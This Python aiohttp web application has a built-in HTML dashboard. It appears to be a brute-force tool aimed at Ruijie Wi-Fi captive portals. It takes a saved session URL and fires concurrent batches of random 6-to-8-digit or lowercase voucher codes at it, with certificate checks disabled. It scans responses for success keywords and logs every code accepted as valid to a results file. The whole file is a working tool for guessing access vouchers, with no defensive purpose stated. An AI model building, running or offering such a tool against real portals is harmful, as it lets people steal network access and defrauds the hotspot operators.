import asyncio
import json
import os
import random
import string
import time
import aiohttp
from aiohttp import web

URLS_PATH = "saved_urls.json"
RESULT_PATH = "results.json"

def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

scanner_state = {
    "is_scanning": False,
    "active_url": "",
    "mode": "6-digit",
    "checked": 0,
    "retry": 0,
    "found": [],
    "speed": 0,
    "start_time": 0
}

def generate_code(mode):
    if mode == "6-digit":
        return ''.join(random.choices(string.digits, k=6))
    elif mode == "7-digit":
        return ''.join(random.choices(string.digits, k=7))
    elif mode == "8-digit":
        return ''.join(random.choices(string.digits, k=8))
    elif mode == "ascii-lower":
        return ''.join(random.choices(string.ascii_lowercase, k=5))
    return ''.join(random.choices(string.digits, k=6))

async def scan_worker():
    global scanner_state
    scanner_state["checked"] = 0
    scanner_state["retry"] = 0
    scanner_state["found"] = []
    scanner_state["start_time"] = time.time()
    scanner_state["is_scanning"] = True
    
    connector = aiohttp.TCPConnector(ssl=False, limit=500)
    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=5)) as session:
        while scanner_state["is_scanning"]:
            batch_size = 20
            tasks = []
            for _ in range(batch_size):
                if not scanner_state["is_scanning"]:
                    break
                code = generate_code(scanner_state["mode"])
                scanner_state["checked"] += 1
                session_url = scanner_state["active_url"]
                test_url = f"{session_url}&voucherCode={code}" if "?" in session_url else f"{session_url}?voucherCode={code}"
                tasks.append(check_code(session, test_url, code))
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            elapsed = time.time() - scanner_state["start_time"]
            if elapsed > 0:
                scanner_state["speed"] = int(scanner_state["checked"] / (elapsed / 60))
            
            await asyncio.sleep(0.3)

async def check_code(session, test_url, code):
    try:
        async with session.get(test_url) as resp:
            res_text = await resp.text()
            res_lower = res_text.lower()
            has_error = any(k in res_lower for k in ["invalid", "fail", "wrong", "error", "expired", "incorrect", "မမှန်ကန်"])
            if resp.status == 200 and not has_error:
                if any(k in res_lower for k in ["success", "auth_ok", "welcome", "successful"]):
                    if not any(item["code"] == code for item in scanner_state["found"]):
                        code_info = {"code": code, "url": scanner_state["active_url"], "time": time.strftime("%H:%M:%S")}
                        scanner_state["found"].append(code_info)
                        all_res = load_json(RESULT_PATH, [])
                        all_res.append(code_info)
                        save_json(RESULT_PATH, all_res)
            else:
                scanner_state["retry"] += 1
    except Exception:
        scanner_state["retry"] += 1

async def handle_index(request):
    html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Ruijie Multi-URL Scanner Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 650px; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
        h2 { color: #38bdf8; text-align: center; }
        label { display: block; margin-top: 15px; font-weight: bold; }
        input[type="text"], select { width: 100%; padding: 10px; margin-top: 5px; background: #0f172a; border: 1px solid #475569; color: #fff; border-radius: 6px; box-sizing: border-box; }
        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
        button { padding: 10px 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: #fff; }
        .btn-add { background: #3b82f6; width: 100%; margin-top: 10px; }
        .btn-start { background: #22c55e; flex: 1; }
        .btn-stop { background: #ef4444; flex: 1; }
        .btn-del { background: #64748b; padding: 5px 10px; font-size: 12px; }
        .url-list { margin-top: 15px; background: #0f172a; padding: 10px; border-radius: 8px; max-height: 150px; overflow-y: auto; border: 1px solid #334155; }
        .url-item { display: flex; justify-content: space-between; align-items: center; padding: 6px 0; border-bottom: 1px solid #334155; font-size: 13px; }
        .url-item span { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 450px; }
        .stats { margin-top: 20px; background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid #334155; }
        .stats p { margin: 8px 0; display: flex; justify-content: space-between; }
        .found-box { margin-top: 20px; background: #064e3b; padding: 15px; border-radius: 8px; border: 1px solid #059669; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Ruijie Multi-URL Scanner</h2>
        
        <label>Add New Session URL:</label>
        <input type="text" id="newUrl" placeholder="https://.../index.html?token=...">
        <button class="btn-add" onclick="addUrl()">Add URL to List</button>
        
        <label>Saved URLs List:</label>
        <div class="url-list" id="urlList">
            <div style="color: #94a3b8; text-align: center;">No URLs saved yet</div>
        </div>

        <label style="margin-top: 20px;">Select Active URL to Scan:</label>
        <select id="selectedUrl"></select>
        
        <label>Scan Mode:</label>
        <select id="scanMode">
            <option value="6-digit">6-digit</option>
            <option value="7-digit">7-digit</option>
            <option value="8-digit">8-digit</option>
            <option value="ascii-lower">ascii-lower</option>
        </select>
        
        <div class="btn-group">
            <button class="btn-start" onclick="startScan()">Start Scan</button>
            <button class="btn-stop" onclick="stopScan()">Stop Scan</button>
        </div>
        
        <div class="stats">
            <p>Status: <span id="statusText" style="color: #94a3b8;">Idle ⚪</span></p>
            <p>Active URL: <span id="activeUrlText" style="color: #38bdf8; font-size: 12px; max-width: 350px; overflow: hidden; text-overflow: ellipsis;">None</span></p>
            <p>Checked: <span id="checkedCount">0</span></p>
            <p>Speed: <span id="speedCount">0</span> codes/min</p>
            <p>Found: <span id="foundCount" style="color: #4ade80;">0</span></p>
            <p>Retry: <span id="retryCount">0</span></p>
        </div>

        <div class="found-box">
            <h3>🎉 Success Codes:</h3>
            <ul id="foundList"><li>None yet</li></ul>
        </div>
    </div>

    <script>
        async function loadUrls() {
            let res = await fetch('/api/urls');
            let urls = await res.json();
            let listEl = document.getElementById('urlList');
            let selectEl = document.getElementById('selectedUrl');
            
            if(urls.length === 0) {
                listEl.innerHTML = '<div style="color: #94a3b8; text-align: center;">No URLs saved yet</div>';
                selectEl.innerHTML = '<option value="">-- No URLs available --</option>';
                return;
            }
            
            listEl.innerHTML = urls.map((u, i) => `
                <div class="url-item">
                    <span>${i+1}. ${u}</span>
                    <button class="btn-del" onclick="deleteUrl('${u}')">Delete</button>
                </div>
            `).join('');
            
            selectEl.innerHTML = urls.map(u => `<option value="${u}">${u}</option>`).join('');
        }

        async function addUrl() {
            let url = document.getElementById('newUrl').value.trim();
            if(!url) { alert('Please enter a URL'); return; }
            let res = await fetch('/api/urls', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({url: url})
            });
            let data = await res.json();
            document.getElementById('newUrl').value = '';
            loadUrls();
        }

        async function deleteUrl(url) {
            await fetch('/api/delete_url', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({url: url})
            });
            loadUrls();
        }

        async function startScan() {
            let url = document.getElementById('selectedUrl').value;
            let mode = document.getElementById('scanMode').value;
            if(!url) { alert('Please select a URL to scan'); return; }
            let res = await fetch('/api/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({url: url, mode: mode})
            });
            let data = await res.json();
            alert(data.message);
        }

        async function stopScan() {
            let res = await fetch('/api/stop', {method: 'POST'});
            let data = await res.json();
            alert(data.message);
        }

        async function fetchStatus() {
            try {
                let res = await fetch('/api/status');
                let data = await res.json();
                document.getElementById('checkedCount').innerText = data.checked.toLocaleString();
                document.getElementById('speedCount').innerText = data.speed;
                document.getElementById('foundCount').innerText = data.found.length;
                document.getElementById('retryCount').innerText = data.retry;
                document.getElementById('activeUrlText').innerText = data.active_url || 'None';
                
                let statusEl = document.getElementById('statusText');
                if(data.is_scanning) {
                    statusEl.innerText = "Running 🟢";
                    statusEl.style.color = "#22c55e";
                } else {
                    statusEl.innerText = "Idle ⚪";
                    statusEl.style.color = "#94a3b8";
                }

                let listEl = document.getElementById('foundList');
                if(data.found.length > 0) {
                    listEl.innerHTML = data.found.map(item => `<li><b>${item.code}</b> (${item.time})</li>`).join('');
                } else {
                    listEl.innerHTML = "<li>None yet</li>";
                }
            } catch(e) {}
        }

        loadUrls();
        setInterval(fetchStatus, 1000);
    </script>
</body>
</html>
"""
    return web.Response(text=html, content_type="text/html")

async def api_get_urls(request):
    urls = load_json(URLS_PATH, [])
    return web.json_response(urls)

async def api_add_url(request):
    data = await request.json()
    url = data.get("url", "").strip()
    if url:
        urls = load_json(URLS_PATH, [])
        if url not in urls:
            urls.append(url)
            save_json(URLS_PATH, urls)
    return web.json_response({"status": "success"})

async def api_delete_url(request):
    data = await request.json()
    url = data.get("url", "").strip()
    urls = load_json(URLS_PATH, [])
    if url in urls:
        urls.remove(url)
        save_json(URLS_PATH, urls)
    return web.json_response({"status": "success"})

async def api_start(request):
    global scanner_state
    data = await request.json()
    scanner_state["active_url"] = data.get("url", "")
    scanner_state["mode"] = data.get("mode", "6-digit")
    if not scanner_state["is_scanning"]:
        asyncio.create_task(scan_worker())
    return web.json_response({"message": "Scan started successfully!"})

async def api_stop(request):
    global scanner_state
    scanner_state["is_scanning"] = False
    return web.json_response({"message": "Scan stopped!"})

async def api_status(request):
    return web.json_response(scanner_state)

app = web.Application()
app.router.add_get('/', handle_index)
app.router.add_get('/api/urls', api_get_urls)
app.router.add_post('/api/urls', api_add_url)
app.router.add_post('/api/delete_url', api_delete_url)
app.router.add_post('/api/start', api_start)
app.router.add_post('/api/stop', api_stop)
app.router.add_get('/api/status', api_status)

if __name__ == '__main__':
    web.run_app(app, host='0.0.0.0', port=8080)
